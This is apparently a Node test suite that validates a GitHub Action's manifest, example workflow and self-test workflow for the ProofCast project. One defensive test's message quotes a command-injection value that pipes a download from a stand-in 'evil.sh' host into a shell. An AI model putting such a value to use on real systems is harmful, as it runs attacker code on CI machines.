import test from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";

import { parse } from "yaml";

import { PROOF_STATUS_CONTEXT } from "../dist/action.js";

/**
 * `action.yml` is a PRODUCT surface: every consumer of
 * `uses: guillaumeCode2012/proofcast@v1` runs this file, and GitHub only reports a
 * malformed manifest at run time, inside someone else's pull request. So the
 * manifest, the copy-paste example workflow, and this repo's own dogfood workflow
 * are parsed and asserted here — a typo fails `npm test` instead of a stranger's CI.
 */
const ACTION = parse(readFileSync("action.yml", "utf8"));
const EXAMPLE = parse(readFileSync("examples/github-action/proof.yml", "utf8"));
const DOGFOOD = parse(readFileSync(".github/workflows/proof.yml", "utf8"));

/** Every `uses:` in a job's steps. */
function usesOf(workflow) {
  return Object.values(workflow.jobs).flatMap((job) => job.steps.map((step) => step.uses).filter(Boolean));
}

test("action.yml is a valid composite action with Marketplace-required metadata", () => {
  assert.equal(ACTION.runs.using, "composite");
  // The Marketplace refuses a listing without these three.
  assert.equal(typeof ACTION.name, "string");
  assert.ok(ACTION.description.length > 20, "needs a real description to be listed");
  assert.ok(ACTION.branding?.icon && ACTION.branding?.color, "branding is required to publish");
  assert.ok(ACTION.runs.steps.length > 0);
});

test("every input is documented and every documented default is real", () => {
  for (const [name, spec] of Object.entries(ACTION.inputs)) {
    assert.ok(spec.description?.trim(), `input \`${name}\` must be documented`);
    assert.ok("default" in spec, `input \`${name}\` must have a default — the action takes no required input`);
  }
  // The headline promise: no secret needed. The token defaults to the built-in one.
  assert.match(String(ACTION.inputs["github-token"].default), /github\.token/);
  assert.equal(ACTION.inputs.path.default, ".");
  assert.equal(ACTION.inputs.execution.default, "local", "a runner HAS a docker daemon; local avoids an image pull");
});

test("every output is wired to a step that actually exists", () => {
  const stepIds = new Set(ACTION.runs.steps.map((s) => s.id).filter(Boolean));
  for (const [name, spec] of Object.entries(ACTION.outputs)) {
    const referenced = String(spec.value).match(/steps\.([\w-]+)\./)?.[1];
    assert.ok(referenced, `output \`${name}\` must read from a step`);
    assert.ok(stepIds.has(referenced), `output \`${name}\` reads from unknown step \`${referenced}\``);
  }
});

test("the three PR-facing deliverables are each wired into the manifest", () => {
  const steps = ACTION.runs.steps;
  const script = JSON.stringify(steps);

  // 1. the video artifact
  const upload = steps.find((s) => String(s.uses ?? "").startsWith("actions/upload-artifact"));
  assert.ok(upload, "the proof video must be uploaded as a workflow artifact");
  assert.match(String(upload.uses), /@v4$/, "v4 is what exposes the artifact-url output");
  assert.equal(upload.with.name, "${{ inputs.artifact-name }}");

  // 2. + 3. the comment and the status check, both produced by the reporter
  const report = steps.find((s) => s.id === "report");
  assert.ok(report, "a reporting step must run after the upload");
  assert.match(String(report.env.GH_TOKEN), /inputs\.github-token/);
  assert.match(String(report.env.PROOFCAST_ARTIFACT_URL), /steps\.upload\.outputs\.artifact-url/);
  assert.match(report.run, /dist\/action\.js/, "the reporter is the tested glue, not inline shell");

  // The proof itself must be recorded, and must not abort the job before reporting.
  assert.match(script, /proofcast run/);
});

test("user input never reaches a shell script through `${{ }}` interpolation", () => {
  for (const step of ACTION.runs.steps) {
    if (!step.run) continue;
    assert.doesNotMatch(
      step.run,
      /\$\{\{\s*inputs\./,
      `step \`${step.name}\` interpolates an input into its script — pass it via env: instead ` +
        "(a value like `; curl evil.sh | sh` would otherwise execute)",
    );
  }
});

test("the install step refuses a ProofCast too old to carry the action glue", () => {
  const install = ACTION.runs.steps.find((s) => s.id === "install");
  // `version: latest` resolves to whatever is on npm, which can predate this action.
  // Without the preflight, that surfaces later as a missing file or a silent no-op.
  assert.match(install.run, /dist\/action\.js/, "must verify the glue is actually present");
  assert.match(install.run, /command -v proofcast/, "must verify the CLI landed on PATH");
  assert.match(install.run, /::error::/, "a mismatch must be a loud annotated failure");
  assert.match(install.run, /exit 1/);
});

test("the reporting step runs even when the proof failed", () => {
  const prove = ACTION.runs.steps.find((s) => s.id === "prove");
  // Without this, `proofcast run`'s non-zero exit would kill the job before the
  // comment/check are written — a failed proof would show up as a bare crash.
  assert.match(prove.run, /\|\|\s*true/, "the prove step must absorb the non-zero exit");
  const report = ACTION.runs.steps.find((s) => s.id === "report");
  assert.ok(!report.if, "the reporter must not be conditional on the proof passing");
});

test("the copy-paste example workflow is what a stranger can actually use", () => {
  assert.deepEqual(EXAMPLE.on, { pull_request: null }, "proof belongs on pull requests");
  // The permissions the reporter needs — omitting either silently downgrades the run.
  assert.equal(EXAMPLE.permissions["pull-requests"], "write");
  assert.equal(EXAMPLE.permissions.statuses, "write");

  const uses = usesOf(EXAMPLE);
  assert.ok(
    uses.some((u) => /^guillaumeCode2012\/proofcast@v\d+$/.test(u)),
    "the example must reference the published action by a major-version tag",
  );
  assert.ok(uses.some((u) => u.startsWith("actions/checkout@")), "the code must be checked out first");

  // Only the inputs the action really declares.
  const step = Object.values(EXAMPLE.jobs)
    .flatMap((job) => job.steps)
    .find((s) => String(s.uses ?? "").includes("proofcast"));
  for (const key of Object.keys(step.with ?? {})) {
    assert.ok(ACTION.inputs[key], `the example passes \`${key}\`, which action.yml does not declare`);
  }
});

test("this repo dogfoods the action from the branch under review", () => {
  const step = Object.values(DOGFOOD.jobs)
    .flatMap((job) => job.steps)
    .find((s) => s.uses === "./");
  assert.ok(step, "proof.yml must run the local action, so a broken PR reddens its own check");
  assert.match(String(step.with.version), /github\.workspace/, "and must install ProofCast from this checkout");
  assert.equal(DOGFOOD.permissions["pull-requests"], "write");
  assert.equal(DOGFOOD.permissions.statuses, "write");
});

test("PROOFCAST_VERSION tracks package.json — it is stamped into every PR comment", async () => {
  const { PROOFCAST_VERSION } = await import("../dist/index.js");
  const pkg = JSON.parse(readFileSync("package.json", "utf8"));
  assert.equal(PROOFCAST_VERSION, pkg.version, "a drifting version misreports itself on every proven pull request");
});

test("the status context in the docs matches the one the code publishes", () => {
  const documented = readFileSync("examples/github-action/proof.yml", "utf8");
  assert.ok(
    documented.includes(PROOF_STATUS_CONTEXT),
    `the example names a check the code does not publish (code says \`${PROOF_STATUS_CONTEXT}\`)`,
  );
});
